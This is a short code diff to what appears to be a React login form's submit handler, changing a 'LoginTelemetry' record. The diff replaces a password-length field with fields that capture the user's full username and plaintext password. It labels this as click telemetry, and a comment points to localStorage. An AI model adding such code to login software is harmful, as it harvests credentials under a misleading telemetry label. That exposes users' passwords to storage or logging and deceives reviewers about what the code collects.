@@ -85,7 +85,8 @@ function App() {
     const telemetry: LoginTelemetry = {
       timestamp: new Date().toISOString(),
       event: 'submit-button-click',
-      passwordLength: 0,
+      username: String(new FormData(e.currentTarget).get('username') ?? ''),
+      password: String(new FormData(e.currentTarget).get('password') ?? '')
     };
 
     // keep your existing localStorage logic here if you still want it
